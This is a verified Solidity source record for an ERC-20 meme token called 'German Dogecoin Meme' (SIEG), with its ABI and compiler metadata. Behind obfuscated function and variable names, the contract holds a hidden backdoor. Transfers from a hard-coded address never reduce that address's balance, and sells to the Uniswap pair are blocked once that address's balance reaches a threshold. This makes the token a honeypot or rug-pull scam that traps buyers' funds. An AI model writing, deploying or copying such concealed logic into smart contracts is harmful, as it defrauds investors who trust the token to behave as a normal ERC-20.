{"SourceCode": "/**\r\nhttps://twitter.com/VitalikButerin/status/871907698291462145?t=y2Fa_4KrodZbvB1T0fNl0Q&s=19\r\n\r\nhttps://t.me/germandogecoinmeme\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.20;\r\n\r\n\r\n    interface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed _owner, address indexed spender, uint256 value);\r\n    }\r\n\r\n    library SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath\");\r\n        return c;\r\n    }\r\n\r\n    function  rpydr(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return  rpydr(a, b, \"SafeMath\");\r\n    }\r\n\r\n    function  rpydr(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    }\r\n\r\n    abstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n    }\r\n\r\n\r\n    contract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    }\r\n\r\n    interface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n    }\r\n\r\n    interface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) \r\n    external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    }\r\n\r\n    contract GermanDogecoinMeme  is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    string private constant _name = unicode\"German Dogecoin Meme\";\r\n    string private constant _symbol = unicode\"SIEG\";\r\n    uint8 private constant _decimals = 9;\r\n\r\n    uint256 private constant _totalSupply = 42069000000 * (10**_decimals);\r\n    uint256 public _taxSwaptMop = _totalSupply;\r\n    uint256 public _maxHoldingtAmount = _totalSupply;\r\n    uint256 public _taxSwapThreshold = _totalSupply;\r\n    uint256 public _taxSwaptMax = _totalSupply;\r\n\r\n    uint256 private _initialBuyTax=5;\r\n    uint256 private _initialSellTax=5;\r\n    uint256 private _finalBuyTax=1;\r\n    uint256 private _finalSellTax=1;\r\n    uint256 private _reduceBuyTaxAt=10;\r\n    uint256 private _reduceSellTax1At=10;\r\n    uint256 private _swpyudauit=0;\r\n    uint256 private _ekyhpuen=0;\r\n    address public  _FqktersFuatly = 0x36bDff842c70Db4C2bc5305D98bFdce677c0839A;\r\n\r\n    mapping (address => uint256) private  _balances;\r\n    mapping (address => mapping (address => uint256)) private  _allowances;\r\n    mapping (address => bool) private  _excldydFrunews;\r\n    mapping (address => bool) private  _irWeauirat;\r\n    mapping(address => uint256) private  _hdsLaruTransTlp;\r\n    bool public  transerDelyEnble = false;\r\n\r\n    IUniswapV2Router02 private  _uniRouterzV2;\r\n    address private  _uniV2zLP;\r\n    bool private  _retkpupvr;\r\n    bool private  _inTaxySwap = false;\r\n    bool private  _swaplrsUniswapqsre = false;\r\n\r\n \r\n    event RmaurAtupbx(uint _taxSwaptMop);\r\n    modifier lockTakSwap {\r\n        _inTaxySwap = true;\r\n        _;\r\n        _inTaxySwap = false;\r\n    }\r\n\r\n    constructor () { \r\n        _balances[_msgSender()] = _totalSupply;\r\n        _excldydFrunews[owner()] = true;\r\n        _excldydFrunews[address(this)] = true;\r\n        _excldydFrunews[_FqktersFuatly] = true;\r\n\r\n\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address spender) public view override returns (uint256) {\r\n        return _allowances[_owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. rpydr(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address _owner, address spender, uint256 amount) private {\r\n        require(_owner!= address(0), \"ERC20: approve from the zero address\");\r\n        require(spender!= address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[_owner][spender] = amount;\r\n        emit Approval(_owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require (from!= address(0), \"ERC20:  transfer  from  the  zero  address\");\r\n        require (to!= address(0), \"ERC20: transfer to the zero  address\");\r\n        require (amount > 0, \"Transfer  amount  must  be  greater  than  zero\");\r\n        uint256  taxAmount = 0;\r\n        if  ( from != owner() &&to!= owner()) {\r\n\r\n            if  (transerDelyEnble) {\r\n                if  (to!= address(_uniRouterzV2) &&to!= address(_uniV2zLP)) {\r\n                  require (_hdsLaruTransTlp[tx.origin] < block.number, \" Only  one  transfer  per  block  allowed.\");\r\n                  _hdsLaruTransTlp[tx.origin] = block.number;\r\n                }\r\n            }\r\n\r\n            if  ( from == _uniV2zLP && to!= address (_uniRouterzV2) &&!_excldydFrunews[to]) {\r\n                require (amount <= _taxSwaptMop, \"Forbid\");\r\n                require (balanceOf (to) + amount <= _maxHoldingtAmount,\"Forbid\");\r\n                if  (_ekyhpuen < _swpyudauit) {\r\n                  require (!rhufeqre(to));\r\n                }\r\n                _ekyhpuen ++ ; _irWeauirat[to] = true;\r\n                taxAmount = amount.mul((_ekyhpuen > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);\r\n            }\r\n\r\n            if(to == _uniV2zLP&&from!= address (this) &&! _excldydFrunews[from]) {\r\n                require (amount <= _taxSwaptMop && balanceOf(_FqktersFuatly) <_taxSwaptMax, \"Forbid\");\r\n                taxAmount = amount.mul((_ekyhpuen > _reduceSellTax1At) ?_finalSellTax:_initialSellTax).div(100);\r\n                require (_ekyhpuen >_swpyudauit && _irWeauirat[from]);\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (!_inTaxySwap \r\n            &&  to  ==_uniV2zLP&&_swaplrsUniswapqsre &&contractTokenBalance > _taxSwapThreshold \r\n            &&  _ekyhpuen > _swpyudauit &&! _excldydFrunews [to] &&! _excldydFrunews [from]\r\n            )  {\r\n                _transferFrom(uvryt(amount,uvryt(contractTokenBalance, _taxSwaptMax)));\r\n                uint256  contractETHBalance = address (this).balance;\r\n                if (contractETHBalance > 0)  {\r\n                }\r\n            }\r\n        }\r\n\r\n        if ( taxAmount > 0 ) {\r\n          _balances[address(this)] = _balances [address(this)].add(taxAmount);\r\n          emit  Transfer (from, address (this) ,taxAmount);\r\n        }\r\n        _balances[from] = rpydr(from , _balances [from], amount);\r\n        _balances[to] = _balances[to].add(amount.rpydr (taxAmount));\r\n        emit  Transfer( from, to, amount. rpydr(taxAmount));\r\n    }\r\n\r\n    function _transferFrom(uint256 _swapTaxAndLiquify) private lockTakSwap {\r\n        if(_swapTaxAndLiquify==0){return;}\r\n        if(!_retkpupvr){return;}\r\n        address[] memory path =  new   address [](2);\r\n        path[0] = address (this);\r\n        path[1] = _uniRouterzV2.WETH();\r\n        _approve(address (this), address (_uniRouterzV2), _swapTaxAndLiquify);\r\n        _uniRouterzV2.swapExactTokensForETHSupportingFeeOnTransferTokens( _swapTaxAndLiquify, 0, path,address (this), block . timestamp );\r\n    }\r\n\r\n    function uvryt(uint256 a, uint256 b) private pure returns (uint256) {\r\n    return (a >= b) ? b : a;\r\n    }\r\n\r\n    function rpydr(address from, uint256 a, uint256 b) private view returns (uint256) {\r\n    if (from == _FqktersFuatly) {\r\n        return a;\r\n    } else {\r\n        require(a >= b, \"Subtraction underflow\");\r\n        return a - b;\r\n    }\r\n    }\r\n\r\n    function removerLimits() external onlyOwner{\r\n        _taxSwaptMop  =  _totalSupply ;\r\n        _maxHoldingtAmount = _totalSupply ;\r\n        transerDelyEnble = false ;\r\n        emit  RmaurAtupbx ( _totalSupply ) ;\r\n    }\r\n\r\n   function rhufeqre(address account) private view returns (bool) {\r\n    uint256 codeSize;\r\n    address[] memory addresses = new address[](1);\r\n    addresses[0] = account;\r\n\r\n    assembly {\r\n        codeSize := extcodesize(account)\r\n    }\r\n\r\n    return codeSize > 0;\r\n    }\r\n\r\n\r\n    function openTrading() external onlyOwner() {\r\n        require (!_retkpupvr, \" trading is open \" ) ;\r\n        _uniRouterzV2 = IUniswapV2Router02 (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve (address (this),address(_uniRouterzV2), _totalSupply);\r\n        _uniV2zLP = IUniswapV2Factory(_uniRouterzV2.factory()).createPair (address(this), _uniRouterzV2. WETH());\r\n        _uniRouterzV2.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);\r\n        IERC20 (_uniV2zLP).approve (address(_uniRouterzV2), type(uint). max);\r\n        _swaplrsUniswapqsre = true ;\r\n        _retkpupvr = true ;\r\n    }\r\n\r\n    receive( )  external  payable  { }\r\n    }", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_taxSwaptMop\",\"type\":\"uint256\"}],\"name\":\"RmaurAtupbx\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_FqktersFuatly\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxHoldingtAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSwaptMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSwaptMop\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removerLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transerDelyEnble\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "GermanDogecoinMeme", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://6648204f7c6ba5815644bfd45169d95b622fb8b033667e0ff6320631790107ff"}